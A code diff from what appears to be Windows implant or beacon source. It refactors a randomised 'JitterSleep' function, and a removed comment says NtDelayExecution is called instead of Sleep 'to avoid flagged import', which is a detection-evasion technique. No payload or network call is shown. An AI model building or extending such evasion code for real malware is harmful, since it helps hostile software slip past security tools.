@@ -350,22 +350,25 @@ BOOL IsElevated() {
 VOID JitterSleep(DWORD minSec, DWORD maxSec) {
     if (minSec > maxSec) minSec = maxSec;
 
-    static std::mt19937 gen = [] {
-        std::random_device rd;
-        return std::mt19937(rd() ^ static_cast<unsigned>(GetCurrentThreadId()));
+    // ponytail: CS + mt19937 in static storage, initialized once via pointer — no copy
+    static CRITICAL_SECTION* cs = []() -> CRITICAL_SECTION* {
+        static CRITICAL_SECTION s;
+        InitializeCriticalSection(&s);
+        return &s;
     }();
-    static CRITICAL_SECTION cs = [] {
-        CRITICAL_SECTION c;
-        InitializeCriticalSection(&c);
-        return c;
+    static std::mt19937* gen = []() -> std::mt19937* {
+        static std::mt19937 g([] {
+            std::random_device rd;
+            return rd() ^ static_cast<unsigned>(GetCurrentThreadId());
+        }());
+        return &g;
     }();
 
     DWORD seconds;
-    EnterCriticalSection(&cs);
-    seconds = std::uniform_int_distribution<DWORD>(minSec, maxSec)(gen);
-    LeaveCriticalSection(&cs);
+    EnterCriticalSection(cs);
+    seconds = std::uniform_int_distribution<DWORD>(minSec, maxSec)(*gen);
+    LeaveCriticalSection(cs);
 
-    // Use NtDelayExecution instead of Sleep to avoid flagged import
     typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
     static NtDelayExecution_t pfnDelay = nullptr;
     if (!pfnDelay) {
